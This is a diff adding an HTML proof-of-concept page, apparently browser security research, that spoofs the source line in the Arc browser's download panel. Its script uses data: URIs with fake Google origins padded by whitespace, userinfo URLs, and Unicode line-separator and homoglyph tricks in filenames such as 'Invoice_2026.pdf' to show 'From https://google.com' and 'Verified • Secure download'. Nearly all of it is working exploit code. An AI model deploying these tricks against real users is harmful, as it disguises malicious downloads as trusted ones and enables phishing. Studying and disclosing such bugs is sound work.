@@ -1,0 +1,50 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Arc Mac — download origin spoof</title>
+<style>
+body{font-family:-apple-system,system-ui,sans-serif;padding:22px;line-height:1.55;max-width:760px}
+button{display:block;width:100%;text-align:left;background:#d92d20;color:#fff;border:0;border-radius:8px;
+padding:11px 14px;font-size:14px;font-weight:600;margin:8px 0;cursor:pointer}
+button.alt{background:#0b62d6}
+code{background:#eee;padding:1px 5px;border-radius:4px;font-size:12px}
+small{color:#666}
+</style></head>
+<body>
+<h2>Arc Mac — download origin spoof</h2>
+<p>Target = the <b>source line</b> in Arc's download panel (<code>Dari https://ajaone.github.io</code>). Goal: make it read google.com.</p>
+
+<button onclick="A()">A · data: hostname → spoof the SOURCE line ★</button>
+<button onclick="B()">B · data: hostname + path (accounts.google.com/signin)</button>
+<button onclick="C()">C · userinfo https://google.com@&lt;host&gt; → source line</button>
+<button class="alt" onclick="D()">D · U+2028 = Cocoa NSLineSeparator → real newline in Arc ★</button>
+<button class="alt" onclick="E()">E · U+2029 paragraph separator variant</button>
+<button class="alt" onclick="F()">F · COMBO: data: source + U+2028 newline + homoglyph</button>
+
+<p><small>File body is always <b>pwned by 33x</b>. Open Arc's download panel after each.</small></p>
+
+<script>
+var C_=String.fromCharCode;
+var COLON=C_(0x2236), SL=C_(0x29F8);      // ∶ ⧸  homoglyph : and /
+var LS=C_(0x2028), PS=C_(0x2029);         // Cocoa NSLineSeparator / NSParagraphSeparator
+var B64=btoa('pwned by 33x');
+
+function go(uri,name){
+  var a=document.createElement('a');
+  a.href=uri; a.download=name;
+  document.body.appendChild(a); a.click(); document.body.removeChild(a);
+}
+// data:<fake-origin><whitespace><mime>;base64,<payload>
+function dataUri(origin,mime){
+  return 'data:'+origin+new Array(240).join(' ')+mime+';base64,'+B64;
+}
+
+function A(){ go(dataUri('https://google.com/','application/octet-stream'),'Q3_Report.pdf'); }
+function B(){ go(dataUri('https://accounts.google.com/signin/verify?ok=1','application/octet-stream'),'Google_Security.pdf'); }
+function C(){ go('https://google.com@'+location.host+location.pathname,'Google_Update.pdf'); }
+function D(){ go(dataUri('https://google.com/','application/octet-stream'),'Invoice_2026.pdf'+LS+'From https'+COLON+SL+SL+'google.com'); }
+function E(){ go(dataUri('https://google.com/','application/octet-stream'),'Invoice_2026.pdf'+PS+'From https'+COLON+SL+SL+'google.com'); }
+function F(){ go(dataUri('https://google.com/','application/octet-stream'),
+  'Q3_Report.pdf'+LS+'From https'+COLON+SL+SL+'google.com'+LS+'Verified '+C_(0x2022)+' Secure download'); }
+</script>
+</body></html>
